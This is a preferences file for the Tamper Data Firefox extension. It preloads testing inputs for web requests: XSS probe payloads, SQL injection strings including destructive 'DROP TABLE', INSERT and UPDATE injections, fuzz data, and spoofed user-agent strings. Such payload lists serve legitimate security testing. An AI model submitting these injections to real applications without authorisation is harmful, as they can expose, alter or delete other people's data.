pref("extensions.{9c51bd27-6ed8-4000-a2bf-36cb95c0c947}.description", "chrome://tamperdata/locale/tamperData.properties");
pref("extensions.tamperdata.debug", "false");
pref("extensions.tamperdata.shouldTamperImages", "false");
pref("extensions.tamperdata.shouldAddOverwritesExisting", "true");
pref("extensions.tamperdata.forceCaching", "true");
// add stuff is tricky, in a=1,b=2 format
pref("extensions.tamperdata.prefill.static.add.Struts cancel",  "org.apache.struts.taglib.html.CANCEL=true");
// on every field
pref("extensions.tamperdata.prefill.static.xss.Alert",  "<script>alert('hello');</script>");
pref("extensions.tamperdata.prefill.static.xss.> Alert",  ">\"'><script>alert(�XSS')</script>");
pref("extensions.tamperdata.prefill.static.xss.%22 Alert",  ">%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>");
pref("extensions.tamperdata.prefill.static.xss.image Alert",  ">\"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>");
pref("extensions.tamperdata.prefill.static.xss.background Alert",  "AK%22%20style%3D%22background:url(javascript:alert(%27XSS%27))%22%20OS%22");
pref("extensions.tamperdata.prefill.static.xss.%2B Alert",  "%22%2Balert(%27XSS%27)%2B%22");
pref("extensions.tamperdata.prefill.static.xss.table Alert",  "<table background='javascript:alert(([code])'></table>");
pref("extensions.tamperdata.prefill.static.xss.object Alert",  "<object type=text/html data='javascript:alert(([code]);'></object>");
pref("extensions.tamperdata.prefill.static.xss.onload Alert",  "<body onload='javascript:alert(([code])'></body>");
pref("extensions.tamperdata.prefill.static.xss.no angle brackets alert",  "&{alert('XSS')};");
pref("extensions.tamperdata.prefill.static.sql.union",  "' union select * from table");
pref("extensions.tamperdata.prefill.static.sql.select all",  "anything' OR 'x'='x");
pref("extensions.tamperdata.prefill.static.sql.integer field select all",  "23 OR 1=1");
pref("extensions.tamperdata.prefill.static.sql.guess field name",  "x' AND fieldName IS NULL; --");
pref("extensions.tamperdata.prefill.static.sql.guess table name",  "x' AND 1=(SELECT COUNT(*) FROM tablename); --");
pref("extensions.tamperdata.prefill.static.sql.like values",  "x' OR full_name LIKE '%Bob%");
pref("extensions.tamperdata.prefill.static.sql.guess specific values",  "bob@example.com' AND passwd = 'hello123");
pref("extensions.tamperdata.prefill.static.sql.drop table",  "x'; DROP TABLE members; --");
pref("extensions.tamperdata.prefill.static.sql.insert",  "x'; INSERT INTO tablename ('field1','field2')  VALUES ('1','2');--");
pref("extensions.tamperdata.prefill.static.sql.update",  "x'; UPDATE tablename SET field1 = 'value' WHERE field1 = 'oldvalue'");
pref("extensions.tamperdata.prefill.static.data.Letters",  "abcdefABCDEF");
pref("extensions.tamperdata.prefill.static.data.Numbers",  "0123456789");
pref("extensions.tamperdata.prefill.static.data.Special",  "~!@#$%^&*()_+='`;,.:<>");
pref("extensions.tamperdata.prefill.static.data.Zero",  "0");
pref("extensions.tamperdata.prefill.static.data.Mixed",  "a0b1c2A3B4C 56789");
pref("extensions.tamperdata.prefill.static.data.Big Number",  "999999999999999");
pref("extensions.tamperdata.prefill.static.data.Big Text",  "asdfrasdfasfdASDFASDFASDFasdfasdfasdfASDFASDFASDFasdfasdfasdfASDFASDFASDFasdfasdfasdfASDFASDFASDF");
// field specific stuff
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Internet Explorer 6.0 on Windows XP", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Internet Explorer 7.0 beta running on Windows Longhorn", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Internet Explorer 5.2 on Mac OS X", "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Konqueror 3.1 (French)", "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Mozilla 1.7.8 on Linux", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Mozilla Firefox 1.0.4 on Windows XP", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Mozilla Firefox 1.0.4 on Ubuntu Linux, on AMD64", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Mozilla Firefox 1.0.4 on FreeBSD 5.4 on i386", "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Netscape 4.8 on Windows 2000", "Mozilla/4.8 [en] (Windows NT 5.0; U)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Netscape 7 on Sun Solaris 8", "Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.0.1) Gecko/20020920 Netscape/7.0");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Netscape 8.0.1 on Windows XP using Gecko", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20050519");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Netscape 8.0.1 on Windows XP using MSHTML (with .NET installed)", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Opera 6.03 on Windows 2000, cloaked as MSIE", "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.03 [en]");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Opera 7.23 on Windows 98", "Opera/7.23 (Windows 98; U) [en]");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Opera 8.00 on Windows XP", "Opera/8.00 (Windows NT 5.1; U; en)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Opera 8.00 on Gentoo Linux", "Opera/8.0 (X11; Linux i686; U; cs)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Safari v125 on Mac OS X", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/124 (KHTML, like Gecko) Safari/125");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Safari v125 on Mac OS X, cloaked as MSIE", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.ELinks 0.4pre5 on Linux", "ELinks (0.4pre5; Linux 2.4.27 i686; 80x25)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Links 0.99pre14 under Cygwin on Windows 2000", "Links (0.99pre14; CYGWIN_NT-5.0 1.5.16(0.128/4/2) i686; 80x25)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Links 2.1pre17 under Gentoo Linux", "Links (2.1pre17; Linux 2.6.11-gentoo-r8 i686; 80x24)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Lynx 2.8.4rel.1 on Linux", "Lynx/2.8.4rel.1 libwww-FM/2.14");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Off By One 3.5a on Windows XP", "Mozilla/4.7 (compatible; OffByOne; Windows 2000)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.w3m on FreeBSD", "w3m/0.5.1");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Crawler for Ask Jeeves/Teoma", "Mozilla/2.0 (compatible; Ask Jeeves/Teoma)");
pref("extensions.tamperdata.prefill.dynamic.User-Agent.Googlebot", "Googlebot/2.1 (+http://www.google.com/bot.html)");
